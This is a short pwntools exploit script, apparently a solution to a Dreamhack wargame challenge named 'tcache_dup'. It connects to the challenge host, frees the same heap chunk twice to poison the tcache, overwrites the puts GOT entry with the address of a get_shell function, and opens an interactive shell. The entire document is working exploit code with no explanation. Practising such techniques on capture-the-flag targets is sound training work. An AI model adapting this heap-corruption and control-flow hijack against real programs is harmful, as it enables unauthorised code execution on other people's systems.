from pwn import *

p=remote("host8.dreamhack.games",19850)
#p=process("./tcache_dup")
e=ELF("./tcache_dup")

def create(size,data):
    p.sendlineafter("> ",b"1")
    p.sendlineafter("Size: ",str(size))
    p.sendlineafter("Data: ",data)

def delete(idx):
    p.sendlineafter("> ",b"2")
    p.sendlineafter("idx: ",str(idx))

create(0x30,b"A"*8)
delete(0)
delete(0)
create(0x30,p64(e.got["puts"]))
create(0x30,"B"*8)
create(0x30,p64(e.symbols["get_shell"]))

p.interactive()